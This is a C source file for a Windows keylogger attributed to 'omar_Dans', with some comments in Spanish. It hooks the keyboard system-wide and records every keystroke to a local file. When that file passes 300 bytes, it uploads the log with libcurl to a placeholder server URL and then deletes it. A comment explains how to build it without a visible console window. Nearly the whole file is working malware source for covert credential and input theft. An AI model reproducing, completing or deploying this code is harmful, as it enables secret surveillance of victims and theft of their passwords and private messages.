// Simple Hand-made keylogger
// Created by: omar_Dans

#include <Windows.h>
#pragma comment(lib, "user32.lib")
#include <stdio.h>
#include <curl.h>
#include <sys/stat.h>

int MAXIMUM_SIZE = 300;

int subirArchivo(void){
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        const char* url = "http://your-domain-here/upload.php"; // This is the url were the logs are going to be uploaded, im using "upload.php" for managing the requests with curl.

        const char* filePath = "/path/to/file"; // path to the file 

        struct curl_httppost *post = NULL;
        struct curl_httppost *last = NULL;

        curl_formadd(&post, &last, CURLFORM_COPYNAME, "archivo", CURLFORM_FILE, filePath, CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
        // sending the request
        printf("*** SENDINF FILE ***\n"); 
        res = curl_easy_perform(curl); 
        // cleaning
        curl_easy_cleanup(curl);
        curl_formfree(post);

        if (res != CURLE_OK) {
            fprintf(stderr, "Error al enviar la solicitud: %s\n", curl_easy_strerror(res));
        }
    }
    remove("archivo.txt");
    curl_global_cleanup();
    return 0;
}


// function for processing especial keys vkcodes
char * translateSpecialKey(DWORD vkcode){
    SHORT shiftState = GetAsyncKeyState(0xa0);
    char * realKey = NULL;
    switch (vkcode) {
        case (0xa0):
            realKey = "[SHIFT]";
            break;
        case (0xa2):
            realKey = "[CTRL]";
            break;
        case (VK_CAPITAL):
            realKey = "[CAPS]";
            break;
        case (VK_BACK):
            realKey = "[BACKSPACE]";
            break;
        case (0xa4):
            realKey = "[ALT]";
            break;
        case (VK_RMENU):
            realKey = "[ALTGR]";
            break;
        case (0xc0):
            realKey = "ñ";
            break;
        default:
            if ((vkcode >= 'A' && vkcode <= 'Z') && !(shiftState & 0x8000)) {
                // Si es una letra y Shift no está presionado, convierte a minúscula
                vkcode += 'a' - 'A';
            }
            if ((vkcode >= 'A' && vkcode <= 'Z') && (shiftState & 0x8000)) {
                // Si es una letra y Shift está presionado, convierte a mayúscula
                vkcode -= 'a' - 'A';
                vkcode += 0x20;
            }
            char buffer[2] = { (char)vkcode, '\0' };
            realKey = strdup(buffer);
            break;

    }
    return realKey;
}



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    char * specialK;
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
            specialK = translateSpecialKey(pKbStruct->vkCode);
            if (specialK != NULL){
                FILE *file;
                file = fopen("archivo.txt", "a");
                if(file != NULL){
                    fprintf(file, "%s",specialK);
                    fclose(file);
                    struct stat buf;
                    int rc = stat("archivo.txt", &buf);
                    if (rc == 0) {
                        if (buf.st_size >= MAXIMUM_SIZE) {
                            subirArchivo();
                        }
                    }
                }
            } else {
                FILE *file;
                file = fopen("archivo.txt", "a");
                if(file != NULL){
                    fprintf(file, "0x%x",pKbStruct->vkCode);
                    fclose(file);
                }
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) -> this line is for creating a WINDOWS program, this is useful for not showing cmd popup when launching the program
int main(void){
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);

    return 0;
}

